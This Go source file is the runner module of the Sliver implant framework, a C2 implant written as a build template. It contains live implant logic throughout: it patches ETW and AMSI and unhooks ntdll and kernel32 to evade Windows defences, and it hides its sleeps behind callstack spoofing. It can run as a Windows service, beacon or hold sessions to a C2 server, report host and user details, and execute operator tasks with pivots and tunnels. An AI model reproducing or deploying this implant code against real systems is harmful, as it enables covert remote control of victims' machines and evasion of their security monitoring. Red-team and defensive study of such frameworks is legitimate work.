//go:build !sliver_lint

package runner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"os"
	"os/user"
	"runtime"
	"time"
	"uuid"

	// {{if .Config.IsPulse}}
	"sync"
	// {{end}}

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	// {{if eq .Config.GOOS "windows"}}
	"github.com/bishopfox/sliver/implant/sliver/evasion"
	// {{end}}
	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
	"github.com/bishopfox/sliver/implant/sliver/limits"
	"github.com/bishopfox/sliver/implant/sliver/locale"
	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/implant/sliver/version"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protoreflect"

	// {{if .Config.IsService}}
	"golang.org/x/sys/windows/svc"
	// {{end}}
)

var (
	InstanceID       string
	connectionErrors = 0
	ErrTerminate     = errors.New("terminate")
)

func init() {
	InstanceID = uuid.NewV4().String()
}

// {{if .Config.IsService}}

type sliverService struct{}

func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
	for {
		select {
		default:
			// {{if .Config.IsPulse}}
			pulseStartup()
			// {{else}}
			sessionStartup()
			// {{end}}
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
			case svc.Pause:
				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
			}
		}
	}
}

// {{end}}

func Main() {

	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	debugFilePath := "{{ .Config.DebugFile }}"
	if debugFilePath != "" {
		// Open the log file for writing
		file, err := os.OpenFile(debugFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
		if err == nil {
			log.SetOutput(file)
		}
	}
	// {{else}}
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	// {{if eq .Config.GOOS "windows"}}
	evasion.PatchETW()
	evasion.PatchAMSI()
	evasion.RefreshPE("ntdll.dll")
	evasion.RefreshPE("kernel32.dll")
	// {{end}}

	// {{if .Config.IsService}}
	svc.Run("{{if .Config.ServiceName}}{{.Config.ServiceName}}{{else}}{{end}}", &sliverService{})
	// {{else}}

	// {{if .Config.IsPulse}}
	pulseStartup()
	// {{else}} ------- IsPulse/IsSession -------
	sessionStartup()
	// {{end}}

	// {{end}} ------- IsService -------
}

// {{if .Config.IsPulse}}
func pulseStartup() {
	// {{if .Config.Debug}}
	log.Printf("Running in Pulse mode with ID: %s", InstanceID)
	// {{end}}
	abort := make(chan struct{})
	defer func() {
		abort <- struct{}{}
	}()
	pulses := transports.StartPulseLoop(abort)
	pendingResults := &pulseResultQueue{}
	for pulse := range pulses {
		// {{if .Config.Debug}}
		log.Printf("Next pulse = %v", pulse)
		// {{end}}
		if pulse != nil {
			// skip stale pulses when c2-uri has changed
			if c2 := transports.GetC2URI(); c2 != "" && c2 != pulse.ActiveC2 {
				// {{if .Config.Debug}}
				log.Printf("[pulse] skipping stale pulse for %s, c2-uri is %s", pulse.ActiveC2, c2)
				// {{end}}
				continue
			}
			err := pulseMainLoop(pulse, pendingResults)
			if err != nil {
				connectionErrors++
				if transports.GetMaxConnectionErrors() < connectionErrors {
					return
				}
			}
		}
		// skip 1m reconnect sleep if c2-uri just changed
		if c2 := transports.GetC2URI(); c2 != "" && (pulse == nil || c2 != pulse.ActiveC2) {
			continue
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}

// {{else}}

func sessionStartup() {
	// {{if .Config.Debug}}
	log.Printf("Running in session mode")
	// {{end}}
	abort := make(chan struct{})
	defer func() {
		abort <- struct{}{}
	}()
	connections := transports.StartConnectionLoop(abort)
	for connection := range connections {
		if connection != nil {
			err := sessionMainLoop(connection)
			if err != nil {
				if err == ErrTerminate {
					connection.Cleanup()
					return
				}
				connectionErrors++
				if transports.GetMaxConnectionErrors() < connectionErrors {
					return
				}
			}
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}

// {{end}}

// {{if .Config.IsPulse}}
type pulseResultQueue struct {
	mu      sync.Mutex
	results []*sliverpb.Envelope
}

func (q *pulseResultQueue) add(result *sliverpb.Envelope) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.results = append(q.results, result)
}

func (q *pulseResultQueue) drain() []*sliverpb.Envelope {
	q.mu.Lock()
	defer q.mu.Unlock()
	results := q.results
	q.results = nil
	return results
}

func (q *pulseResultQueue) prepend(results []*sliverpb.Envelope) {
	if len(results) == 0 {
		return
	}
	q.mu.Lock()
	defer q.mu.Unlock()
	combined := make([]*sliverpb.Envelope, 0, len(results)+len(q.results))
	combined = append(combined, results...)
	combined = append(combined, q.results...)
	q.results = combined
}

func pulseMainLoop(pulse *transports.Pulse, pendingResults *pulseResultQueue) error {
	// Register pulse
	err := pulse.Init()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Pulse init error: %s", err)
		// {{end}}
		return err
	}
	defer func() {
		err := pulse.Cleanup()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pulse] cleanup failure %s", err)
			// {{end}}
		}
	}()

	err = pulse.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting pulse: %s", err)
		// {{end}}
		connectionErrors++
		if transports.GetMaxConnectionErrors() < connectionErrors {
			return err
		}
		return nil
	}
	connectionErrors = 0
	// {{if .Config.Debug}}
	log.Printf("Registering pulse with server")
	// {{end}}
	register := registerSliver()
	register.ActiveC2 = pulse.ActiveC2
	register.ProxyURL = pulse.ProxyURL
	pulse.Send(wrapEnvelope(sliverpb.MsgPulseRegister, &sliverpb.PulseRegister{
		ID:          InstanceID,
		Interval:    pulse.Interval(),
		Jitter:      pulse.Jitter(),
		Register:    register,
		NextCheckin: int64(pulse.Duration().Seconds()),
	}))
	time.Sleep(time.Second)
	pulse.Close()

	return pulseCheckinLoop(pulse, pendingResults, pulseMain)
}

type pulseCheckinFunc func(*transports.Pulse, time.Time, *pulseResultQueue) error

// pulseCheckinLoop schedules check-ins without overlapping them. Pulse
// transport callbacks share per-check-in connection state, so the previous
// check-in must finish closing its resources before the next one can start.
func pulseCheckinLoop(pulse *transports.Pulse, pendingResults *pulseResultQueue, checkin pulseCheckinFunc) error {
	for {
		duration := pulse.Duration()
		nextCheckin := time.Now().Add(duration)
		oldInterval := pulse.Interval()
		err := checkin(pulse, nextCheckin, pendingResults)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pulse] main error: %v", nextCheckin)
			// {{end}}
			return err
		}

		// {{if .Config.Debug}}
		log.Printf("[pulse] sleep until %v", nextCheckin)
		// {{end}}
		if oldInterval == pulse.Interval() {
			// Keep the original start-to-start cadence when the check-in
			// finishes before its deadline. If it overruns, begin the next
			// check-in immediately without overlapping shared transport state.
			if remaining := time.Until(nextCheckin); 0 < remaining {
				// {{if eq .Config.GOOS "windows"}}
				evasion.SleepWithCallstackSpoof(remaining)
				// {{else}}
				evasion.ObfuscatedSleep(remaining)
				// {{end}}
			}
		}

		// check if reconfig used to set a new C2-URI
		if c2 := transports.GetC2URI(); c2 != "" && c2 != pulse.ActiveC2 {
			// {{if .Config.Debug}}
			log.Printf("[pulse] C2 URI changed to %s, reconnecting...", c2)
			// {{end}}
			return nil
		}
	}
}

func pulseMain(pulse *transports.Pulse, nextCheckin time.Time, pendingResults *pulseResultQueue) error {
	err := pulse.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pulse] start failure %s", err)
		// {{end}}
		return err
	}
	defer func() {
		// {{if .Config.Debug}}
		log.Printf("[pulse] closing ...")
		// {{end}}
		time.Sleep(time.Second)
		pulse.Close()
	}()

	// Collect any pending results from background tasks.
	completedResults := pendingResults.drain()

	// {{if .Config.Debug}}
	log.Printf("[pulse] sending check in with %d pending results...", len(completedResults))
	// {{end}}
	err = pulse.Send(wrapEnvelope(sliverpb.MsgPulseTasks, &sliverpb.PulseTasks{
		ID:          InstanceID,
		NextCheckin: int64(pulse.Duration().Seconds()),
		Tasks:       completedResults,
	}))
	if err != nil {
		pendingResults.prepend(completedResults)
		// {{if .Config.Debug}}
		log.Printf("[pulse] send failure %s", err)
		// {{end}}
		return err
	}
	// The server deliberately does not return pending tasks on a result-only
	// check-in. Waiting for a response here blocks this loop until another
	// check-in replaces the transport connection.
	if len(completedResults) > 0 {
		return nil
	}
	// {{if .Config.Debug}}
	log.Printf("[pulse] recv task(s) ...")
	// {{end}}
	envelope, err := pulse.Recv()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pulse] recv failure %s", err)
		// {{end}}
		return err
	}
	if envelope == nil {
		// {{if .Config.Debug}}
		log.Printf("[pulse] read nil envelope (no tasks)")
		// {{end}}
		return nil
	}
	tasks := &sliverpb.PulseTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pulse] unmarshal failure %s", err)
		// {{end}}
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("[pulse] received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return nil
	}

	var tasksExtensionRegister []*sliverpb.Envelope
	var tasksOther []*sliverpb.Envelope

	for _, task := range tasks.Tasks {
		switch task.Type {
		case sliverpb.MsgRegisterExtensionReq:
			tasksExtensionRegister = append(tasksExtensionRegister, task)
		default:
			tasksOther = append(tasksOther, task)
		}
	}

	// Dispatch tasks to background - results sent to pendingResults as each completes
	// Extensions must be registered synchronously before other tasks can use them
	for _, r := range pulseHandleTasklist(tasksExtensionRegister) {
		pendingResults.add(r)
	}

	// Dispatch other tasks individually - each sends its result when done
	pulseDispatchTasks(tasksOther, pendingResults)

	// {{if .Config.Debug}}
	log.Printf("[pulse] tasks dispatched to background, check-in complete")
	// {{end}}
	return nil
}

// pulseDispatchTasks dispatches tasks to run in background, sending results as each completes
func pulseDispatchTasks(tasks []*sliverpb.Envelope, pendingResults *pulseResultQueue) {
	sysHandlers := handlers.GetSystemHandlers()
	specHandlers := handlers.GetKillHandlers()

	for _, task := range tasks {
		// {{if .Config.Debug}}
		log.Printf("[pulse] dispatching task %d", task.Type)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			data := task.Data
			taskID := task.ID
			// {{if eq .Config.GOOS "windows" }}
			go func() {
				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
					// {{if .Config.Debug}}
					if err != nil {
						log.Printf("[pulse] handler function returned an error: %s", err)
					}
					log.Printf("[pulse] task completed (id: %d)", taskID)
					// {{end}}
					pendingResults.add(&sliverpb.Envelope{
						ID:   taskID,
						Data: data,
					})
				})
			}()
			//  {{else}}
			go func() {
				handler(data, func(data []byte, err error) {
					// {{if .Config.Debug}}
					if err != nil {
						log.Printf("[pulse] handler function returned an error: %s", err)
					}
					log.Printf("[pulse] task completed (id: %d)", taskID)
					// {{end}}
					pendingResults.add(&sliverpb.Envelope{
						ID:   taskID,
						Data: data,
					})
				})
			}()
			// {{end}}
		} else if task.Type == sliverpb.MsgOpenSession {
			go openSessionHandler(task.Data)
			pendingResults.add(&sliverpb.Envelope{
				ID:   task.ID,
				Data: []byte{},
			})
		} else if handler, ok := specHandlers[task.Type]; ok {
			go handler(task.Data, nil)
		} else {
			pendingResults.add(&sliverpb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
		}
	}
}

func pulseHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
	results := []*sliverpb.Envelope{}
	resultsMutex := &sync.Mutex{}
	wg := &sync.WaitGroup{}
	sysHandlers := handlers.GetSystemHandlers()
	specHandlers := handlers.GetKillHandlers()

	for _, task := range tasks {
		// {{if .Config.Debug}}
		log.Printf("[pulse] execute task %d", task.Type)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			data := task.Data
			taskID := task.ID
			// {{if eq .Config.GOOS "windows" }}
			wg.Go(func() {
				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
					resultsMutex.Lock()
					defer resultsMutex.Unlock()
					// {{if .Config.Debug}}
					if err != nil {
						log.Printf("[pulse] handler function returned an error: %s", err)
					}
					log.Printf("[pulse] task completed (id: %d)", taskID)
					// {{end}}
					results = append(results, &sliverpb.Envelope{
						ID:   taskID,
						Data: data,
					})
				})
			})
			//  {{else}}
			wg.Go(func() {
				handler(data, func(data []byte, err error) {
					resultsMutex.Lock()
					defer resultsMutex.Unlock()
					// {{if .Config.Debug}}
					if err != nil {
						log.Printf("[pulse] handler function returned an error: %s", err)
					}
					log.Printf("[pulse] task completed (id: %d)", taskID)
					// {{end}}
					results = append(results, &sliverpb.Envelope{
						ID:   taskID,
						Data: data,
					})
				})
			})
			// {{end}}
		} else if task.Type == sliverpb.MsgOpenSession {
			go openSessionHandler(task.Data)
			resultsMutex.Lock()
			results = append(results, &sliverpb.Envelope{
				ID:   task.ID,
				Data: []byte{},
			})
			resultsMutex.Unlock()
		} else if handler, ok := specHandlers[task.Type]; ok {
			wg.Add(1)
			handler(task.Data, nil)
		} else {
			resultsMutex.Lock()
			results = append(results, &sliverpb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
			resultsMutex.Unlock()
		}
	}

	// {{if .Config.Debug}}
	log.Printf("[pulse] waiting for task(s) to complete ...")
	// {{end}}
	wg.Wait() // Wait for all tasks to complete
	// {{if .Config.Debug}}
	log.Printf("[pulse] all tasks completed, sending results to server")
	// {{end}}

	return results
}

func openSessionHandler(data []byte) {
	openSession := &sliverpb.OpenSession{}
	err := proto.Unmarshal(data, openSession)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pulse] failed to parse open session msg: %s", err)
		// {{end}}
	}

	if openSession.Delay != 0 {
		// {{if .Config.Debug}}
		log.Printf("[pulse] delay %s", time.Duration(openSession.Delay))
		// {{end}}
		time.Sleep(time.Duration(openSession.Delay))
	}

	go func() {
		abort := make(chan struct{})
		connections := transports.StartConnectionLoop(abort, openSession.C2S...)
		defer func() { abort <- struct{}{} }()
		connectionAttempts := 0
		for connection := range connections {
			connectionAttempts++
			if connection != nil {
				err := sessionMainLoop(connection)
				if err == ErrTerminate {
					connection.Cleanup()
					return
				}
				if err == nil {
					break
				}
				// {{if .Config.Debug}}
				log.Printf("[pulse] failed to connect to server: %s", err)
				// {{end}}
			}
			if len(openSession.C2S) <= connectionAttempts {
				// {{if .Config.Debug}}
				log.Printf("[pulse] failed to connect to server, max connection attempts reached")
				// {{end}}
				break
			}
		}
	}()
}

// {{end}} -IsPulse

func sessionMainLoop(connection *transports.Connection) error {
	if connection == nil {
		// {{if .Config.Debug}}
		log.Printf("[session] nil connection!")
		// {{end}}
		return nil
	}
	err := connection.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[session] failed to establish connection: %s", err)
		// {{end}}
		return err
	}
	pivots.RestartAllListeners(connection.SendEnvelope)
	defer pivots.StopAllListeners()
	defer connection.Stop()

	connectionErrors = 0
	// Reconnect active pivots
	// pivots.ReconnectActivePivots(connection)
	register := registerSliver()
	register.ActiveC2 = connection.URL()
	register.ProxyURL = connection.ProxyURL()
	if !connection.SendEnvelope(wrapEnvelope(sliverpb.MsgRegister, register)) {
		return nil
	}

	pivotHandlers := handlers.GetPivotHandlers()
	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	specialHandlers := handlers.GetKillHandlers()
	rportfwdHandlers := handlers.GetRportFwdHandlers()

	for {
		var envelope *sliverpb.Envelope
		select {
		case received, ok := <-connection.Recv:
			if !ok {
				return nil
			}
			envelope = received
		case <-connection.Done():
			return nil
		}
		if envelope == nil {
			continue
		}
		if _, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			return ErrTerminate
		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := rportfwdHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] rportfwdHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// Beware, here be dragons.
			// This is required for the specific case of token impersonation:
			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
			// only applies the token to the calling thread, we need to call it before every task.
			// It's fucking gross to do that here, but I could not come with a better solution.

			// {{if .Config.Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}

			responseID := envelope.ID
			// {{if eq .Config.GOOS "windows" }}
			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.SendEnvelope(&sliverpb.Envelope{
					ID:   responseID,
					Data: data,
				})
			})
			// {{else}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.SendEnvelope(&sliverpb.Envelope{
					ID:   responseID,
					Data: data,
				})
			})
			// {{end}}
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if envelope.Type == sliverpb.MsgCloseSession {
			return nil
		} else {
			// {{if .Config.Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
			if !connection.SendEnvelope(&sliverpb.Envelope{
				ID:                 envelope.ID,
				Data:               nil,
				UnknownMessageType: true,
			}) {
				return nil
			}
		}
	}
	return nil
}

// Envelope - Creates an envelope with the given type and data.
func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
	data, err := proto.Marshal(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: msgType,
		Data: data,
	}
}

// registerSliver - Creates a registration protobuf message
func registerSliver() *sliverpb.Register {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<err>",
			Uid:      "<err>",
			Gid:      "<err>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		// TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<err>"
		}
	}

	// Retrieve UUID
	uuid := hostuuid.GetUUID()
	// {{if .Config.Debug}}
	log.Printf("Host Uuid: %s", uuid)
	// {{end}}

	return &sliverpb.Register{
		Name:              consts.SliverName,
		Hostname:          hostname,
		Uuid:              uuid,
		Username:          currentUser.Username,
		Uid:               currentUser.Uid,
		Gid:               currentUser.Gid,
		Os:                runtime.GOOS,
		Version:           version.GetVersion(),
		Arch:              runtime.GOARCH,
		Pid:               int32(os.Getpid()),
		Filename:          filename,
		ReconnectInterval: int64(transports.GetReconnectInterval()),
		ConfigID:          "{{ .Config.ID }}",
		PeerID:            pivots.MyPeerID,
		Locale:            locale.GetLocale(),
		Capabilities:      implantCapabilities(),
	}
}
